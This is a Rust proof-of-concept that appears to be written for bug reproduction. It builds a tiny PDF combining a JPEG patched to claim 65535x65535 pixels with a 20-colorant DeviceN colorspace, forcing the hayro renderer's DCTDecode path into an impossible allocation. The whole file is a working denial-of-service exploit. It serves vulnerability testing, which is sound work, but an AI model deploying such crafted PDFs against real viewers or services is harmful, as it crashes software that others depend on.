// Standalone reproduction for candidate 006: hayro-syntax's DCTDecode filter
// (hayro-syntax/src/filter/dct.rs) caps an image's declared width/height at u16::MAX each (so it
// cannot repeat candidate 004's astronomical-dimension trick), but never caps the decoded output
// buffer size (width * height * num_components) before eagerly allocating it via zune-jpeg's
// `decoder.decode()`. A PDF's own `/DeviceN` colorant-name array lets an attacker pick
// `num_components` independently of the actual JPEG stream's real component count, multiplying
// the already-large 65535x65535 pixel grid by as many components as the array declares - forcing
// an allocation request far beyond any real address space from a ~1.3KB file with a 286-byte
// embedded JPEG.
//
// This drives the exact same public entry point a real PDF viewer built on `hayro` uses:
// `hayro::render(page, ...)` on a page parsed from real, on-disk-shaped PDF bytes via
// `hayro::hayro_syntax::Pdf::new`.
//
// Exit code convention: 0 = did not reproduce (patched - bug absent), abort/non-zero = reproduced.

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};

// A minimal 1x1 RGB JPEG (produced with `convert -size 1x1 xc:red -quality 90
// -sampling-factor 1x1 tiny.jpg`), then hex-patched so its own SOF0 marker declares a
// 65535x65535 frame instead of 1x1 (offsets found via `find(b"\xff\xc0")`, height/width fields
// at offset+5/offset+7 respectively) - matching this exact repro's own image dictionary. The
// scan data is unmodified (still just enough entropy-coded data for a real 1x1 image); it is
// irrelevant to the bug because the oversized allocation happens before any of it is decoded.
const JPEG: &[u8] = include_bytes!("patched.jpg");

const NUM_COMPONENTS: usize = 20;

fn build_poc_pdf() -> Vec<u8> {
    // A `/DeviceN` colorspace with 20 colorants (not 1/3/4, so `dct.rs` takes its
    // `ColorSpace::MultiBand` branch and multiplies the declared 65535x65535 pixel grid by 20
    // components instead of 3/4) needs a valid alternate space and tint-transform `Function` to
    // parse at all - a trivial `/DeviceGray` alternate and an empty (never-evaluated, since the
    // crash happens at DCT decode time, long before any pixel color conversion) Type 4 PostScript
    // function stream are enough.
    let names: String = (0..NUM_COMPONENTS)
        .map(|i| format!("/C{i}"))
        .collect::<Vec<_>>()
        .join(" ");
    let domain: String = (0..NUM_COMPONENTS).map(|_| "0 1 ").collect();

    let func_body: &[u8] = b"{ }";
    let mut obj6 = format!(
        "<< /FunctionType 4 /Domain [{}] /Length {} >>",
        domain.trim_end(),
        func_body.len()
    )
    .into_bytes();
    obj6.extend_from_slice(b"\nstream\n");
    obj6.extend_from_slice(func_body);
    obj6.extend_from_slice(b"\nendstream");

    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 65535 /Height 65535 \
/BitsPerComponent 8 /ColorSpace [/DeviceN [{names}] /DeviceGray 6 0 R] /Filter /DCTDecode /Length {} >>",
        JPEG.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JPEG);
    obj4.extend_from_slice(b"\nendstream");

    let content: &[u8] = b"q 100 0 0 100 50 50 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
        obj6,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!("built PoC PDF: {} bytes (embedded JPEG: {} bytes)", pdf_bytes.len(), JPEG.len());

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = pdf.pages().iter().next().expect("PoC PDF has one page");

    let (w, h) = page.render_dimensions();
    println!("page render dimensions (from MediaBox, ordinary-sized): {w} x {h}");

    let settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!(
        "rendering page (the embedded DCTDecode image declares 65535 x 65535 px, RGB - if there \
is no total-pixel cap, this is where an oversized allocation is attempted)..."
    );

    let pixmap = render(page, &cache, &settings, &render_settings);

    println!(
        "did not reproduce - rendered successfully, {}x{} px pixmap",
        pixmap.width(),
        pixmap.height()
    );
}
